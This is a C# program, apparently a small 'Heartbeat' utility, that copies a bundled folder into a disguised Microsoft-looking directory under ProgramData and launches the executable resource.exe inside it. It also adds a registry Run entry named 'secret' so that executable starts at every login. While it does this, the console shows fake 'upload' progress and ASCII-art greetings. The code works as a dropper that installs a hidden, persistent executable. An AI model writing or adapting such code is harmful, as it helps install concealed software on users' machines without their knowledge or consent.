using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Timers;

namespace Play
{
    class Heartbeat
    {
        private readonly Timer _timer;
        private bool checkFlag = true;
        const string targetFolderPath = @"C:\ProgramData\Microsoft\Windows\Telescope";
        static int displayCheck = 0;
        public Heartbeat()
        {
            Console.Clear();
            _timer = new Timer(3000) { AutoReset = true };
            _timer.Elapsed += TimerElapsed;
        }
        async private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            CheckFolder();
            if (checkFlag)
            {
                CopyFolder();
                RunProcess();
                SetStartup();
                checkFlag = false;
            }
            PrintFunny();
        }
        private static void CheckFolder()
        {
            if (!Directory.Exists(targetFolderPath))
            {
                Directory.CreateDirectory(targetFolderPath);
            }
            Console.WriteLine("upload--25.00%");
        }
        private static void CopyFolder()
        {
            string currentPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            string sourceFolderPath = Path.Combine(currentPath, @"data");
            CopyFilesRecursively(sourceFolderPath, targetFolderPath);
            Console.WriteLine("upload--50.00%");
        }
        private static void CopyFilesRecursively(string sourcePath, string targetPath)
        {
            //Now Create all of the directories
            foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
            {
                Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));
            }

            //Copy all the files & Replaces any files with the same name
            foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
            {
                File.Copy(newPath, newPath.Replace(sourcePath, targetPath), true);
            }
        }
        private static void RunProcess()
        {
            Process[] pname = Process.GetProcessesByName("resource");
            if (pname.Length == 0)
            {
                string currentPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
                string filename = currentPath + @"\data\resource.exe";
                Process.Start(filename);
            }
            Console.WriteLine("upload--75.00%");
        }
        private static void SetStartup2()
        {
            string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(runKey, true))
            {
                key.SetValue("resource", targetFolderPath + @"\resource.exe");
            }
            Console.WriteLine("upload-100.00%");
        }
        private static void SetStartup()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("secret", targetFolderPath + @"\resource.exe");

            Console.WriteLine("upload-100.00%");
        }
        private static void PrintFunny()
        {
            displayCheck++;
            if (displayCheck == 1) PrintFunny1();
            else if (displayCheck == 2) PrintFunny2();
            else if (displayCheck == 3) PrintFunny3();
            else if (displayCheck == 4) { PrintFunny4(); displayCheck = 0; }


        }
        private static void PrintFunny1()
        {
            Console.WriteLine("+----------------------------------------------------+");
            Console.WriteLine("|  $$    $$ $$$$$$$$ $$       $$        $$$$$$   $$  |");
            Console.WriteLine("|  $$    $$ $$       $$       $$       $$    $$  $$  |");
            Console.WriteLine("|  $$$$$$$$ $$$$$$$$ $$       $$       $$    $$  $$  |");
            Console.WriteLine("|  $$    $$ $$       $$       $$       $$    $$      |");
            Console.WriteLine("|  $$    $$ $$$$$$$$ $$$$$$$$ $$$$$$$$  $$$$$$   $$  |");
            Console.WriteLine("+----------------------------------------------------+");
        }
        private static void PrintFunny2()
        {
            Console.WriteLine("+------------------------------+");
            Console.WriteLine("|  $$    $$  $$$$$$  $$ $$ $$  |");
            Console.WriteLine("|  $$    $$ $$    $$ $$ $$ $$  |");
            Console.WriteLine("|  $$$$$$$$ $$    $$ $$ $$ $$  |");
            Console.WriteLine("|  $$    $$ $$    $$  $$  $$   |");
            Console.WriteLine("|  $$    $$  $$$$$$   $$  $$   |");
            Console.WriteLine("+------------------------------+");
        }
        private static void PrintFunny3()
        {
            Console.WriteLine("+------------------------------+");
            Console.WriteLine("|    $$$$   $$$$$$$  $$$$$$$$  |");
            Console.WriteLine("|   $$  $$  $$    $$ $$        |");
            Console.WriteLine("|  $$$$$$$$ $$$$$$$  $$$$$$$$  |");
            Console.WriteLine("|  $$    $$ $$   $$  $$        |");
            Console.WriteLine("|  $$    $$ $$    $$ $$$$$$$$  |");
            Console.WriteLine("+------------------------------+");
        }
        private static void PrintFunny4()
        {
            Console.WriteLine("+---------------------------------------+");
            Console.WriteLine("|  $$    $$  $$$$$$  $$    $$  $$$$$$   |");
            Console.WriteLine("|   $$  $$  $$    $$ $$    $$ $$    $$  |");
            Console.WriteLine("|    $$$$   $$    $$ $$    $$      $$   |");
            Console.WriteLine("|     $$    $$    $$ $$    $$           |");
            Console.WriteLine("|     $$     $$$$$$   $$$$$$     $$     |");
            Console.WriteLine("+---------------------------------------+");
        }
        public void Start()
        {
            _timer.Start();
            Console.Clear();
        }
        public void Stop()
        {
            _timer.Stop();
        }
    }
}
